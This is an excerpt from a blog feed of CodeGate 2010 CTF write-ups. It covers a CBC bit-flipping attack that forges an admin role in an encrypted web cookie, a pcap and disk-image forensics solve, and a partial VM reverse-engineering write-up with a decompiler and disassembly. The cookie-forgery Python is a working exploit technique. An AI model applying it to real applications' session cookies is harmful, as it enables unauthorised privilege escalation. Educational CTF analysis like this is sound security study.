        <td>5X5A0e3r48gXhUXZHEKBa5dpC+XfdVv4oamlriyi5yM=</td>
      </tr>
    </tbody>
  </table>
</blockquote>

<table>
  <tbody>
    <tr>
      <td>The cookie includes 2 parts delimited by character ‘</td>
      <td>’. After base64 decode the first part of the cookie, we have a 16-byte value. According to the hint, this is the IV of the cipher. And because it has 16-byte length, I guess that this challenge used AES cipher, and the block size is 16 bytes. Moreover, the cipher has an IV, so it can’t be in ECB mode. I guessed it in CBC mode. The last part is the base64 of a 32-byte value. This is a cipher text. We will exploit this value later.</td>
    </tr>
  </tbody>
</table>

<p>Browse the URL again, we will receive another message: “<em>Welcome back, namnx! Your role is: user. You need admin role.</em>” Take a look into this message, we can guess the operation of this app: it will receive the cookie from the client, decrypt it to get the user and role information and return the message to the client based on the user and role information. So, in order to get further information, we must have the admin role. This is our goal in this challenge.<strong><span style="font-family: Georgia,'Times New Roman',serif"> </span></strong></p>

<h3 id="exploit">Exploit</h3>

<p>I wrote some Python to work on this challenge easier:</p>

<pre class="brush: python; title: ; notranslate" title="">import urllib, urllib2
    import base64, re

    url = 'http://ctf1.codegate.org/99b5f49189e5a688492f13b418474e7e/web4.php'
    user_agent = 'Mozilla/4.0 (compatible; MSIE 5.5; Windows NT)'

    def get_cookie(user):
        headers = { 'User-Agent' : user_agent}
        values = {'username' : user, 'submit' : "Submit"}
        data = urllib.urlencode(values)
        request = urllib2.Request(url, data, headers)
        response = urllib2.urlopen(request)
        cookie = response.info().get('Set-Cookie')
        groups = re.match("web4_auth=(.+)|(.+);.+", cookie).groups()
        iv = base64.b64decode(groups[0])
        cipher = base64.b64decode(groups[1])
        return iv, cipher

    def get_message(iv, cipher):
        cookie = base64.b64encode(iv) + '|' + base64.b64encode(cipher)
        cookie = urllib.quote(cookie)
        cookie = 'web4_auth=' + cookie
        headers = { 'User-Agent' : user_agent, 'Cookie': cookie}
        request = urllib2.Request(url, None, headers)
        response = urllib2.urlopen(request)
        data = response.read()
        print repr(data)
        groups = re.match(".+, (.*)! .+: (.*). You.+", data).groups()
        return groups[0], groups[1]
</pre>

<p>The first function, get_cookie will submit a value as a username in the first visit to the page, get the returned cookie, and then parse it to get the IV and cipher. The second function, get_message, do the task like when you visit the page in later times, it parses the response message to get the returned username and role.</p>

<pre class="brush: python; title: ; notranslate" title="">&gt;&gt;&gt; iv, cipher = get_cookie('123456789012')
    &gt;&gt;&gt; len(cipher)
    32
    &gt;&gt;&gt; iv, cipher = get_cookie('1234567890123')
    &gt;&gt;&gt; len(cipher)
    48
</pre>

<p>When you input the user with a 12-byte value, the returned cipher will have 32 bytes (2 blocks). And when you enter a 13-byte value, the cipher will have 48 bytes (3 blocks). This means that beside the username value, the plain text of the cipher will be added more 20 bytes.</p>

<p>Try altering the cipher text to see how it is decrypted:</p>

<pre class="brush: python; title: ; notranslate" title="">&gt;&gt;&gt; iv, cipher = get_cookie('1234567890')
    &gt;&gt;&gt; cipher1 = cipher[:-1] + '&#092;&#048;0'
    &gt;&gt;&gt; username, role = get_message(iv, cipher1)
    'Welcome back, 1234567xa2xc2xcaxfeixdbxee_cxa7xd7x0cxa9jxe0xbb! Your role is: . You need admin role.'
</pre>

<p>As you can see, the last block of the decrypted role is the first block of the plain text. So, the format of the plain text may be: ‘username=’ + username + [11 bytes].</p>

<p>To here, we can guess that the format of the plain text can be something like:</p>

<blockquote>
  <p>‘username=’ + username + [delimiter] + [param] + ‘=’ + [value]</p>
</blockquote>

<p>The last 11 bytes of the plain text can be determined by the code below:</p>

<pre class="brush: python; title: ; notranslate" title="">&gt;&gt;&gt; iv, cipher = get_cookie('x00')
    &gt;&gt;&gt; username, role = get_message(iv, cipher)
    'Welcome back, x00##role=userx00x00x00x00x00x00x00x00x00x00x00! Your role is: . You need admin role.'
</pre>

<p>You can see the last 11 bytes of the plain text in the returned message. So, at this time, we can conclude format of the plain text is:</p>

<blockquote>
  <p>‘username=’ + username + ‘##role=’ + role</p>
</blockquote>

<p>Now, the last thing we have to do is altering the role value to ‘admin’. Because we’ve already known the format of the plain text, we can choose to input the username close to the target plain text and try to alter the cipher text in the way that the decrypted value is what we want.</p>

<p>Let remind the operation of CBC mode in cryptographic ciphers. In encryption process:</p>

<blockquote>
  <p>y[1] = C(IV xor x[1])<br />
y[n] = C(y[n-1] xor x[n])</p>
</blockquote>

<p>and in the decryption:</p>

<blockquote>
  <p>x[1] = D(y[1]) xor IV<br />
x[n] = D(y[n]) xor y[n-1]</p>
</blockquote>

<p>Notice that if we flip one bit in the (n-1)th block of cipher text, the respective bit in the n-th block of plain text will be also flipped. So, we will you this fact to exploit the challenge:</p>

<pre class="brush: python; title: ; notranslate" title="">&gt;&gt;&gt; iv, cipher = get_cookie('012345678901234567890123#role=admin')
    &gt;&gt;&gt; s = cipher[:16] + chr(ord(cipher[16]) ^ 0x10) + cipher[17:]
    &gt;&gt;&gt; username, role = get_message(iv, s)
    'Welcome back, 0123456Lxaax17mxe9x91xdcxe2`#z)xd8mxd8x18! Your role is: admin. You need admin role. Congratulations! Here is your flag: the_magic_words_are_squeamish_ossifrage_^-^!!!!!'
</pre>

<p>Successful! Such an interesting challenge, isn’t it?</p>

<h3 id="references">References</h3>

<ul>
  <li><a href="http://en.wikipedia.org/wiki/Block_cipher_modes_of_operation" target="_blank">Block cipher modes of operation</a></li>
  <li><a href="http://en.wikipedia.org/wiki/Bit-flipping_attack" target="_blank">Bit-flipping attack</a></li>
</ul>

  ]]></description>
</item>

	<item>
  <title>CodeGate 2010 &#8211; Challenge 6 writeup</title>
  <link>http://realjenius.com/ctf%20-%20clgt%20crew/2010/03/20/codegate-2010-challenge-6-writeup.html</link>
  <author>R.J. Lorimer</author>
  <pubDate>2010-03-20T00:00:00+08:00</pubDate>
  <guid>http://realjenius.com/ctf%20-%20clgt%20crew/2010/03/20/codegate-2010-challenge-6-writeup.html</guid>
  <description><![CDATA[
     <h1 id="summary">Summary</h1>

<p>Challenge 6 is a forensics problem with a mountain of data, a packet capture file and a FAT32 filesystem image. In order to find the secret you have to watch for the “key” exchanged via MSN conversation in a packet capture file, then use it to find the secret file name. With forensics problems, luck is more important than techniques and you should only do it if you don’t have anything to play during the game.</p>

<h1 id="analysis">Analysis</h1>

<p>Challenge information:</p>

<blockquote>
  <p>credentials:</p>

  <p>http://ctf.codegate.org/thisiswhereiuploadmyfiles/CC2A8B4FA2E1FA6BD7FE9B8EFC86BCB7</p>

  <p>Substitute for those who are not in Korea : http://www.mediafire.com/?wyhexdmzzdm</p>

  <p>You should convert the flag into lower case letters and try to auth with it.</p>

  <p>Hint: The packet of messenger is important. You don’t need to care the ftp stuff.</p>

  <p>Hint2: Please put your flag without any extension to the auth page.</p>
</blockquote>

<h2 id="file-info">File info</h2>

<blockquote>
  <pre>$ file CC2A8B4FA2E1FA6BD7FE9B8EFC86BCB7
CC2A8B4FA2E1FA6BD7FE9B8EFC86BCB7: gzip compressed data, from Unix, last modified: Fri Mar 12 17:20:19 2010
</pre>
</blockquote>

<p>$ zcat CC2A8B4FA2E1FA6BD7FE9B8EFC86BCB7 &gt; challenge6
$ file challenge6
challenge6: POSIX tar archive (GNU)</p>

<p>$ tar xvf challenge6
352FCD8BDEC8244CDED00CA866CA24B9
B400CBEA39EA52126E2478E9A951CDE8</p>

<p>$ file 352FCD8BDEC8244CDED00CA866CA24B9 B400CBEA39EA52126E2478E9A951CDE8
352FCD8BDEC8244CDED00CA866CA24B9: tcpdump capture file (little-endian) - version 2.4 (Ethernet, capture length 65535)
B400CBEA39EA52126E2478E9A951CDE8: x86 boot sector, code offset 0x58, OEM-ID “MSDOS5.0”,
sectors/cluster 8, reserved sectors 4334, Media descriptor 0xf8, heads 255, sectors 1982464 (volumes &gt; 32 MB) ,
FAT (32 bit), sectors/FAT 1929, reserved3 0x800000, serial number 0x7886931a, unlabeled&lt;/pre&gt;</p>

<p>We have 2 files: a tcpdump packet capture and a FAT32 filesystem image. From the hints (yes, without it we don’t know what to search for), we focus our search to:</p>

<ul>
  <li>Final secret key must be a file and it may rely on FAT32 image</li>
  <li>Keyword to find out that secret file must be exchanged via MSN conversation(s) in tcpdump file</li>
</ul>

<h2 id="msn-conversation">MSN conversation</h2>

<p>Using chaosreader (you can use other tools to have the same result) to analyse pcap file, we will have a list of sessions like below:</p>

<p><img class="alignnone size-full wp-image-733" title="Chaosreader Report - msnp" src="http://vnsecurity.net/wp/storage/uploads/2010/03/Chaosreader-Report-352FCD8BDEC8244CDED00CA866CA24B9.pcap_1269063206104.png" alt="Chaosreader Report - msnp" width="953" height="173" /></p>

<p>The session number 263 &amp; 264 is MSN chat. Following the conversion by looking in to raw file we find some interesting things:</p>

<blockquote>
  <p><span style="color: #0000ff">forensic-proof@live.com&gt; i;d like to get a file that i asked you before……<br /> forensic-proof@live.com&gt; now availabel?</span></p>

  <p><span style="color: #ff0000">securityholic@hotmail.com&gt; ah<br /> securityholic@hotmail.com&gt; ok wait a min <img src="http://vnsec-new.cloudapp.net/wp/wp-includes/images/smilies/icon_smile.gif" alt=":)" class="wp-smiley" /><br /> </span><br />
[… MSN P2P file transfer session …]</p>

  <p><span style="color: #0000ff">forensic-proof@live.com&gt; thanks….<br /> </span><br />
<span style="color: #ff0000">securityholic@hotmail.com&gt; this is between you and me :-/</span></p>
</blockquote>

<p>It looks like they exchange some “secret” via MSN P2P file transfer. Looking at file transfer session (refer to References for MSN protocol) :</p>

<blockquote>
  <p>To: &lt;msnmsgr:securityholic@hotmail.com;{95178158-37b6-45ce-b332-2042a4d27563}&gt;<br />
From: &lt;msnmsgr:forensic-proof@live.com;{281f2818-580b-46f0-909f-c009de526642}&gt;<br />
Via: MSNSLP/1.0/TLP ;branch={51D93360-BFBD-40CB-AD0A-2D7FB5C28031}<br />
CSeq: 1<br />
Call-ID: {71021C00-FE1C-4E91-B415-D2145D7C1C24}<br />
Max-Forwards: 0<br />
Content-Type: application/x-msnmsgr-transrespbody<br />
Content-Length: 482</p>

  <p>Listening: true<br />
NeedConnectingEndpointInfo: false<br />
Conn-Type: Direct-Connect<br />
TCP-Conn-Type: Direct-Connect<br />
IPv6-global: 2001:0:cf2e:3096:2036:1131:5c67:c1c5<br />
UPnPNat: false<br />
Capabilities-Flags: 1<br />
<strong>srddA-lanretnI4vPI: 85.26.251.361<br />
troP-lanretnI4vPI: 2133</strong><br />
IPv6-Addrs: 2001:0:cf2e:3096:2036:1131:5c67:c1c5 2002:a398:3e3a::a398:3e3a<br />
IPv6-Port: 3313<br />
Nat-Trav-Msg-Type: WLX-Nat-Trav-Msg-Direct-Connect-Resp<br />
Bridge: TCPv1<br />
Hashed-Nonce: {E3759BB3-EED9-04F3-3B1A-56044619D59F}</p>
</blockquote>

<p>What the hell is this: **srddA-lanretnI4vPI: 85.26.251.361? **It’s reversed! So, file transfer session has this information: **IPv4Internal-Addrs: 163.152.62.58, IPv4Internal-Port: 3312. **It’s confirmed by looking at chaosreader output:</p>

<p><img class="alignnone size-full wp-image-734" title="Chaosreader Report- 3312" src="http://vnsecurity.net/wp/storage/uploads/2010/03/Chaosreader-Report-352FCD8BDEC8244CDED00CA866CA24B9.pcap_1269063302409.png" alt="Chaosreader Report- 3312" width="914" height="21" /></p>

<p>Let dump that session and use tcpxtract to extract files from the pcap:</p>

<blockquote>
  <pre>$ tcpdump -nn -r 352FCD8BDEC8244CDED00CA866CA24B9 'port 3312' -w 3312.pcap</pre>

  <pre>$ tcpxtract -f 3312.pcap
 Found file of type "pdf" in session [163.152.62.59:37390 -&gt; 163.152.62.58:61452], exporting to 00000001.pdf
 Found file of type "jpg" in session [163.152.62.59:37390 -&gt; 163.152.62.58:61452], exporting to 00000008.jpg
 Found file of type "jpg" in session [163.152.62.59:37390 -&gt; 163.152.62.58:61452], exporting to 00000009.jpg
 Found file of type "jpg" in session [163.152.62.59:37390 -&gt; 163.152.62.58:61452], exporting to 00000010.jpg
 Found file of type "jpg" in session [163.152.62.59:37390 -&gt; 163.152.62.58:61452], exporting to 00000011.jpg
 Found file of type "jpg" in session [163.152.62.59:37390 -&gt; 163.152.62.58:61452], exporting to 00000012.jpg
 Found file of type "jpg" in session [163.152.62.59:37390 -&gt; 163.152.62.58:61452], exporting to 00000013.jpg
 Found file of type "jpg" in session [163.152.62.59:37390 -&gt; 163.152.62.58:61452], exporting to 00000014.jpg</pre>
</blockquote>

<p>During the game, we opened PDF file but it’s just blank then we focused on JPG files, but no luck. Re-examined the blank PDF, by “Select All” we found there’s hidden text at the bottom of  the page: **CC105EE2A139A631175571452968D637. **Looks like a “key” – checksum of the secret file.</p>

<p>Searching on FA32 filesystem image for that checksum:</p>

<blockquote>
  <pre>$ sudo mount -o loop,ro B400CBEA39EA52126E2478E9A951CDE8 /mnt/loop
</pre>
</blockquote>

<p>$ find /mnt/loop -type f -exec md5sum {} ; &gt;&gt; md5sum.txt</p>

<p>$ grep -i CC105EE2A139A631175571452968D637 md5sum.txt
cc105ee2a139a631175571452968d637  /mnt/loop/hqksksk/iologmsg.dat&lt;/pre&gt;</p>

<p>Matched! Finally, the secret key is: **iologmsg. **We’re just lucky!</p>

<p>Now, look back to the hint “You should convert the flag into lower case letters and try to auth with it.”, it sounds irrelevant or the md5sum was the correct key at first?</p>

<h1 id="references">References</h1>

<ul>
  <li><a href="http://msnpiki.msnfanatic.com/index.php/MSNC:MSNSLP" target="_blank">http://msnpiki.msnfanatic.com/index.php/MSNC:MSNSLP</a></li>
  <li><a href="http://www.hypothetic.org/docs/msn/client/file_transfer.php" target="_blank">http://www.hypothetic.org/docs/msn/client/file_transfer.php</a></li>
  <li><a href="http://chaosreader.sourceforge.net/" target="_blank">http://chaosreader.sourceforge.net/</a></li>
  <li><a href="http://tcpxtract.sourceforge.net/" target="_blank">http://tcpxtract.sourceforge.net/</a></li>
</ul>

<p>Keywords: network forensics, msn protocol, codegate 2010</p>

  ]]></description>
</item>

	<item>
  <title>No CodeGate 2010 CTF final for CLGT</title>
  <link>http://realjenius.com/ctf%20-%20clgt%20crew/2010/03/20/no-codegate-2010-ctf-final-for-clgt.html</link>
  <author>R.J. Lorimer</author>
  <pubDate>2010-03-20T00:00:00+08:00</pubDate>
  <guid>http://realjenius.com/ctf%20-%20clgt%20crew/2010/03/20/no-codegate-2010-ctf-final-for-clgt.html</guid>
  <description><![CDATA[
     <p>Due to the budget problem, we will not join the final round of CodeGate 2010 CTF in Seoul next month.</p>

<p>Good luck to the other teams and enjoy the game.</p>

<p>-CLGT Team</p>

  ]]></description>
</item>

	<item>
  <title>CodeGate 2010 Challenge 2 – Xbox pwned</title>
  <link>http://realjenius.com/ctf%20-%20clgt%20crew/2010/03/19/codegate-2010-challenge2-xbox-pwned.html</link>
  <author>R.J. Lorimer</author>
  <pubDate>2010-03-19T00:00:00+08:00</pubDate>
  <guid>http://realjenius.com/ctf%20-%20clgt%20crew/2010/03/19/codegate-2010-challenge2-xbox-pwned.html</guid>
  <description><![CDATA[
     <h1 id="summary">Summary</h1>

<p>This is the most interesting challenge in CodeGate 2010 IMHO. The binary is a VM which loads the <em>‘codefile’</em> and execute it. The VM <em>codefile</em> is protected from being tampered with a TEA based hash algorithm. By exploiting the weakness of hash algorithm (similar to Xbox hack) together with a bug inside VM, we could change the execution flow of VM code to get back the secret key content.</p>

<h1 id="analysis">Analysis</h1>

<p>Challenge information</p>

<blockquote>
  <p>credentials: ssh hugh@ctf4.codegate.org -p 9474 password=takeitaway<br />
Exploit /home/hugh/yboy to read secret.key</p>
</blockquote>

<p>There are <em>yboy</em>, <em>codefile</em> and <em>secret.key</em> files in the home directory of hugh (you can download these files <a href="http://force.vnsecurity.net/download/rd/yboy.tgz">here</a> if you want to try it by yourself)</p>

<blockquote>
  <p>-rw-r–r– 1 codegate codegate 1136 2010-03-12 14:45 codefile<br />
-r——– 1 daryl daryl 140 2010-03-12 15:27 secret.key<br />
-rwsr-xr-x 1 daryl root 22307 2010-03-12 16:07 yboy</p>
</blockquote>

<h3 id="a-reverse-engineering-yboy">a. Reverse Engineering yboy</h3>

<p><em>yboy</em> basically does the following things</p>

<ul>
  <li>load VM codes from the codefile into memory (code[])</li>
  <li>load content of secret.key into memory (data[])</li>
  <li>check for the integrity of codefile using TEA based hash algorithm against a hard-coded hash value. Exit if the hash not matched</li>
  <li>parse/decode loaded VM codes and execute it accordingly</li>
</ul>

<p>For the VM code inside codefile</p>

<ul>
  <li>ask user to input password</li>
  <li>compare the input with flag inside secret.key</li>
  <li>if correct, print out the flag</li>
  <li>otherwise, print out access denied error and exit</li>
</ul>

<p><strong>b. Decompiler for codefile</strong></p>

<p>Since <em>yboy</em> load VM code from <em>codefile</em> and execute it, I wrote a decompiler for it</p>

<pre class="brush: cpp; title: ; notranslate" title="">#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;

unsigned char *decode[32] = {
        "halt", "push", "pop", "add", "sub", "or", "xor", "nor", "shl",
        "shr", "not", "nop", "branch", "jumpreg", "callreg", "load",
        "store", "halt", "inputchar", "outputchar", "set_imm", "reload",
        "rrandom", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop",
        "nop",
};

unsigned long registers[64];
unsigned long code[32768];
unsigned int PC;

int main(int argc, char **argv)
{
        unsigned int ins;
        unsigned char reg;
        unsigned char imm1, imm2;
        unsigned char opcode;

        unsigned int codesize;
        int set_imm = 1;
        FILE *f;

        f = fopen(argv[1], "r");
        codesize = fread(code, 1, sizeof(code), f);
        fclose(f);
        //check_code();

        PC = 0;
        while (PC &lt; (codesize) / 4) {
                set_imm = 1;
                ins = code[PC];

                opcode = (ins &gt;&gt; 24);   //&amp; 0x1f;
                reg = (ins &gt;&gt; 16) &amp; 0xFF;
                imm1 = (ins &gt;&gt; 8) &amp; 0xFF;
                imm2 = (unsigned char) ins;

                // set_imm
                if (opcode == 20) {
                        printf("%04x: tr%d = %s %x, %x", PC, reg,
                            decode[opcode &amp; 0x1f], imm1, imm2);

                        if (imm2 &amp;&amp; !imm1)
                                printf("t; %c", imm2);
                        else if (imm1)
                                printf("t; %04x", imm2 + (imm1 &lt;&lt; 8));

                        printf("n");
                        PC++;
                        continue;
                }

                reg = (ins &gt;&gt; 16) &amp; 0xBF;
                imm1 = (ins &gt;&gt; 8) &amp; 0xBF;
                imm2 = ins &amp; 0xBF;

                printf("%04x: tr%d = %s r%d, r%d", PC, reg,
                    decode[opcode &amp; 0x1f], imm1, imm2);

                if (opcode == 12)       // comment for branch
                        printf("t; if (r%d) goto r%dn", imm1, imm2);
                else
                        printf("n");

                PC++;
        }
        return 0;
}
</pre>

<p>Here is the output of the decompiler (click to open)</p>

<pre class="brush: cpp; collapse: true; light: false; title: ; toolbar: true; notranslate" title="">rd@jps(~/working/ctf/codegate2010/2/)$ ./yboy-decompile codefile
0000:   r1 = set_imm 0, 45      ; E
0001:   r0 = outputchar r1, r0
0002:   r1 = set_imm 0, 6e      ; n
0003:   r0 = outputchar r1, r0
0004:   r1 = set_imm 0, 74      ; t
0005:   r0 = outputchar r1, r0
0006:   r1 = set_imm 0, 65      ; e
0007:   r0 = outputchar r1, r0
0008:   r1 = set_imm 0, 72      ; r
0009:   r0 = outputchar r1, r0
000a:   r1 = set_imm 0, 20      ;
000b:   r0 = outputchar r1, r0
000c:   r1 = set_imm 0, 70      ; p
000d:   r0 = outputchar r1, r0
000e:   r1 = set_imm 0, 61      ; a
000f:   r0 = outputchar r1, r0
0010:   r1 = set_imm 0, 73      ; s
0011:   r0 = outputchar r1, r0
0012:   r1 = set_imm 0, 73      ; s
0013:   r0 = outputchar r1, r0
0014:   r1 = set_imm 0, 77      ; w
0015:   r0 = outputchar r1, r0
0016:   r1 = set_imm 0, 6f      ; o
0017:   r0 = outputchar r1, r0
0018:   r1 = set_imm 0, 72      ; r
0019:   r0 = outputchar r1, r0
001a:   r1 = set_imm 0, 64      ; d
001b:   r0 = outputchar r1, r0
001c:   r1 = set_imm 0, 3e      ; &gt;
001d:   r0 = outputchar r1, r0
001e:   r1 = set_imm 0, 3e      ; &gt;
001f:   r0 = outputchar r1, r0
0020:   r60 = set_imm 0, ff     ; �
0021:   r61 = set_imm 0, 1      ;
0022:   r4 = set_imm 5, 39      ; 0539
0023:   r3 = inputchar r0, r0
0024:   r50 = set_imm 0, a      ;
0025:   r0 = store r4, r3
0026:   r0 = nop r0, r0
0027:   r10 = sub r3, r50
0028:   r10 = not r10, r0
0029:   r11 = set_imm 0, 2f     ; /
002a:   r0 = branch r10, r11    ; if (r10) goto r11
002b:   r4 = add r61, r4
002c:   r10 = sub r60, r3
002d:   r11 = set_imm 0, 23     ; #
002e:   r0 = branch r10, r11    ; if (r10) goto r11
002f:   r19 = set_imm 5, 39     ; 0539
0030:   r20 = set_imm 0, 0
0031:   r21 = set_imm 0, 23     ; #
0032:   r21 = sub r21, r20
0033:   r21 = not r21, r0
0034:   r22 = set_imm 0, 5e     ; ^
0035:   r0 = branch r21, r22    ; if (r21) goto r22
0036:   r21 = load r20, r0
0037:   r25 = add r19, r20
0038:   r0 = nop r0, r0
0039:   r26 = load r25, r0
003a:   r26 = sub r21, r26
003b:   r22 = set_imm 0, 41     ; A
003c:   r0 = branch r26, r22    ; if (r26) goto r22
003d:   r23 = set_imm 0, 1      ;
003e:   r20 = add r20, r23
003f:   r22 = set_imm 0, 31     ; 1
0040:   r0 = branch r22, r22    ; if (r22) goto r22
0041:   r1 = set_imm 0, 41      ; A
0042:   r0 = outputchar r1, r0
0043:   r1 = set_imm 0, 63      ; c
0044:   r0 = outputchar r1, r0
0045:   r1 = set_imm 0, 63      ; c
0046:   r0 = outputchar r1, r0
0047:   r1 = set_imm 0, 65      ; e
0048:   r0 = outputchar r1, r0
0049:   r1 = set_imm 0, 73      ; s
004a:   r0 = outputchar r1, r0
004b:   r1 = set_imm 0, 73      ; s
004c:   r0 = outputchar r1, r0
004d:   r1 = set_imm 0, 20      ;
004e:   r0 = outputchar r1, r0
004f:   r1 = set_imm 0, 44      ; D
0050:   r0 = outputchar r1, r0
0051:   r1 = set_imm 0, 65      ; e
0052:   r0 = outputchar r1, r0
0053:   r1 = set_imm 0, 6e      ; n
0054:   r0 = outputchar r1, r0
0055:   r1 = set_imm 0, 69      ; i
0056:   r0 = outputchar r1, r0
0057:   r1 = set_imm 0, 65      ; e
0058:   r0 = outputchar r1, r0
0059:   r1 = set_imm 0, 64      ; d
005a:   r0 = outputchar r1, r0
005b:   r1 = set_imm 0, a       ;
005c:   r0 = outputchar r1, r0
005d:   r0 = halt r0, r0
005e:   r1 = set_imm 0, 47      ; G
005f:   r0 = outputchar r1, r0
0060:   r1 = set_imm 0, 72      ; r
0061:   r0 = outputchar r1, r0
0062:   r1 = set_imm 0, 65      ; e
0063:   r0 = outputchar r1, r0
0064:   r1 = set_imm 0, 65      ; e
0065:   r0 = outputchar r1, r0
0066:   r1 = set_imm 0, 74      ; t
0067:   r0 = outputchar r1, r0
0068:   r1 = set_imm 0, 7a      ; z
0069:   r0 = outputchar r1, r0
006a:   r1 = set_imm 0, 20      ;
006b:   r0 = outputchar r1, r0
006c:   r1 = set_imm 0, 68      ; h
006d:   r0 = outputchar r1, r0
006e:   r1 = set_imm 0, 61      ; a
006f:   r0 = outputchar r1, r0
0070:   r1 = set_imm 0, 63      ; c
0071:   r0 = outputchar r1, r0
0072:   r1 = set_imm 0, 6b      ; k
0073:   r0 = outputchar r1, r0
0074:   r1 = set_imm 0, 65      ; e
0075:   r0 = outputchar r1, r0
0076:   r1 = set_imm 0, 72      ; r
0077:   r0 = outputchar r1, r0
0078:   r1 = set_imm 0, 73      ; s
0079:   r0 = outputchar r1, r0
007a:   r1 = set_imm 0, 2e      ; .
007b:   r0 = outputchar r1, r0
007c:   r1 = set_imm 0, 20      ;
007d:   r0 = outputchar r1, r0
007e:   r1 = set_imm 0, 4b      ; K
007f:   r0 = outputchar r1, r0
0080:   r1 = set_imm 0, 65      ; e
0081:   r0 = outputchar r1, r0
0082:   r1 = set_imm 0, 65      ; e
0083:   r0 = outputchar r1, r0
0084:   r1 = set_imm 0, 70      ; p
0085:   r0 = outputchar r1, r0
0086:   r1 = set_imm 0, 20      ;
0087:   r0 = outputchar r1, r0
0088:   r1 = set_imm 0, 75      ; u
0089:   r0 = outputchar r1, r0
008a:   r1 = set_imm 0, 70      ; p
008b:   r0 = outputchar r1, r0
008c:   r1 = set_imm 0, 20      ;
008d:   r0 = outputchar r1, r0
008e:   r1 = set_imm 0, 74      ; t
008f:   r0 = outputchar r1, r0
0090:   r1 = set_imm 0, 68      ; h
0091:   r0 = outputchar r1, r0
0092:   r1 = set_imm 0, 65      ; e
0093:   r0 = outputchar r1, r0
0094:   r1 = set_imm 0, 20      ;
0095:   r0 = outputchar r1, r0
0096:   r1 = set_imm 0, 67      ; g
0097:   r0 = outputchar r1, r0
0098:   r1 = set_imm 0, 6f      ; o
0099:   r0 = outputchar r1, r0
009a:   r1 = set_imm 0, 6f      ; o
009b:   r0 = outputchar r1, r0
009c:   r1 = set_imm 0, 64      ; d
009d:   r0 = outputchar r1, r0
009e:   r1 = set_imm 0, 20      ;
009f:   r0 = outputchar r1, r0
00a0:   r1 = set_imm 0, 77      ; w
00a1:   r0 = outputchar r1, r0
00a2:   r1 = set_imm 0, 6f      ; o
00a3:   r0 = outputchar r1, r0
00a4:   r1 = set_imm 0, 72      ; r
00a5:   r0 = outputchar r1, r0
00a6:   r1 = set_imm 0, 6b      ; k
00a7:   r0 = outputchar r1, r0
00a8:   r1 = set_imm 0, 2e      ; .
00a9:   r0 = outputchar r1, r0
00aa:   r1 = set_imm 0, 20      ;
00ab:   r0 = outputchar r1, r0
00ac:   r1 = set_imm 0, 53      ; S
00ad:   r0 = outputchar r1, r0
00ae:   r1 = set_imm 0, 74      ; t
00af:   r0 = outputchar r1, r0
00b0:   r1 = set_imm 0, 61      ; a
00b1:   r0 = outputchar r1, r0
00b2:   r1 = set_imm 0, 79      ; y
00b3:   r0 = outputchar r1, r0
00b4:   r1 = set_imm 0, 20      ;
00b5:   r0 = outputchar r1, r0
00b6:   r1 = set_imm 0, 73      ; s
00b7:   r0 = outputchar r1, r0
00b8:   r1 = set_imm 0, 68      ; h
00b9:   r0 = outputchar r1, r0
00ba:   r1 = set_imm 0, 61      ; a
00bb:   r0 = outputchar r1, r0
00bc:   r1 = set_imm 0, 72      ; r
00bd:   r0 = outputchar r1, r0
00be:   r1 = set_imm 0, 70      ; p
00bf:   r0 = outputchar r1, r0
00c0:   r1 = set_imm 0, 2e      ; .
00c1:   r0 = outputchar r1, r0
00c2:   r1 = set_imm 0, 20      ;
00c3:   r0 = outputchar r1, r0
00c4:   r1 = set_imm 0, 44      ; D
00c5:   r0 = outputchar r1, r0
00c6:   r1 = set_imm 0, 69      ; i
00c7:   r0 = outputchar r1, r0
00c8:   r1 = set_imm 0, 73      ; s
00c9:   r0 = outputchar r1, r0
00ca:   r1 = set_imm 0, 6f      ; o
00cb:   r0 = outputchar r1, r0
00cc:   r1 = set_imm 0, 62      ; b
00cd:   r0 = outputchar r1, r0
00ce:   r1 = set_imm 0, 65      ; e
00cf:   r0 = outputchar r1, r0
00d0:   r1 = set_imm 0, 79      ; y
00d1:   r0 = outputchar r1, r0
00d2:   r1 = set_imm 0, 20      ;
00d3:   r0 = outputchar r1, r0
00d4:   r1 = set_imm 0, 6d      ; m
00d5:   r0 = outputchar r1, r0
00d6:   r1 = set_imm 0, 69      ; i
00d7:   r0 = outputchar r1, r0
00d8:   r1 = set_imm 0, 73      ; s
00d9:   r0 = outputchar r1, r0
00da:   r1 = set_imm 0, 69      ; i
00db:   r0 = outputchar r1, r0
00dc:   r1 = set_imm 0, 6e      ; n
00dd:   r0 = outputchar r1, r0
00de:   r1 = set_imm 0, 66      ; f
00df:   r0 = outputchar r1, r0
00e0:   r1 = set_imm 0, 6f      ; o
00e1:   r0 = outputchar r1, r0
00e2:   r1 = set_imm 0, 72      ; r
00e3:   r0 = outputchar r1, r0
00e4:   r1 = set_imm 0, 6d      ; m
00e5:   r0 = outputchar r1, r0
00e6:   r1 = set_imm 0, 61      ; a
00e7:   r0 = outputchar r1, r0
00e8:   r1 = set_imm 0, 74      ; t
00e9:   r0 = outputchar r1, r0
00ea:   r1 = set_imm 0, 69      ; i
00ec:   r1 = set_imm 0, 6f      ; o
00ed:   r0 = outputchar r1, r0
00ee:   r1 = set_imm 0, 6e      ; n
00ef:   r0 = outputchar r1, r0
00f0:   r1 = set_imm 0, 2e      ; .
00f1:   r0 = outputchar r1, r0
00f2:   r1 = set_imm 0, a       ;
00f3:   r0 = outputchar r1, r0
00f4:   r1 = set_imm 0, 59      ; Y
00f5:   r0 = outputchar r1, r0
00f6:   r1 = set_imm 0, 6f      ; o
00f7:   r0 = outputchar r1, r0
00f8:   r1 = set_imm 0, 75      ; u
00f9:   r0 = outputchar r1, r0
00fa:   r1 = set_imm 0, 72      ; r
00fb:   r0 = outputchar r1, r0
00fc:   r1 = set_imm 0, 20      ;
00fd:   r0 = outputchar r1, r0
00fe:   r1 = set_imm 0, 66      ; f
00ff:   r0 = outputchar r1, r0
0100:   r1 = set_imm 0, 6c      ; l
0101:   r0 = outputchar r1, r0
0102:   r1 = set_imm 0, 61      ; a
0103:   r0 = outputchar r1, r0
0104:   r1 = set_imm 0, 67      ; g
0105:   r0 = outputchar r1, r0
0106:   r1 = set_imm 0, 20      ;
0107:   r0 = outputchar r1, r0
0108:   r1 = set_imm 0, 69      ; i
0109:   r0 = outputchar r1, r0
010a:   r1 = set_imm 0, 73      ; s
010b:   r0 = outputchar r1, r0
010c:   r1 = set_imm 0, 3a      ; :
010d:   r0 = outputchar r1, r0
010e:   r1 = set_imm 0, 20      ;
010f:   r0 = outputchar r1, r0
0110:   r29 = set_imm 0, 1      ;
